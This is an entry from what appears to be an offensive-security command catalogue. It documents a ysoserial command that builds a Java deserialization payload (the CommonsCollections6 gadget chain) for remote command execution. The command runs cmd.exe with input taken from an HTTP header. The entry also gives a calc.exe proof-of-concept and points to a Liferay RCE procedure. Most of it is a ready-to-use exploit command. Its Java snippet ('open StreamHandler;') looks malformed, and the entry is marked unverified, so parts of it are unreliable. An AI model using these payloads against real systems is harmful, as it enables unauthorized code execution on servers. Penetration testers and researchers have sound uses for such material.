---
data: >-
  java -jar ysoserial.jar CommonsCollections6 'open StreamHandler; new
  java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c",
  request.getHeader("cmd2")}).start();' > payload.ser
tags:
  - payload
  - deserialization
type: command
output: null
executor: bash
platforms:
  - Linux
  - Java
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:23:54.369Z'
id: 3fdaac22-4545-4ff0-b921-29c850951de8
verified: false
validated: true
submitted: true
---
# ysoserial-generate-payload

## Command

```bash
java -jar ysoserial.jar CommonsCollections6 'open StreamHandler; new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", request.getHeader("cmd2")}).start();' > payload.ser
```

## Description

Generates a serialized Java payload using ysoserial for deserialization exploits, specifically a CommonsCollections6 gadget chain that executes commands via ProcessBuilder based on an HTTP header value.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| CommonsCollections6 | Gadget chain type for Apache Commons | Yes |
| 'java code' | Custom Java expression to execute (e.g., ProcessBuilder invocation) | Yes |
| > payload.ser | Output file for the serialized payload | Yes |

## Examples

### Basic Usage

```bash
java -jar ysoserial.jar CommonsCollections6 'Runtime.getRuntime().exec("calc.exe")' > calc.ser
```

### Advanced Usage

As shown, for header-driven command execution in Liferay exploit.

## Expected Output

Binary serialized file (payload.ser) ready for base64 encoding and use in HTTP requests.

## Related

- [[Related Procedure|procedures/Exploit-Liferay-Deserialization-RCE]]
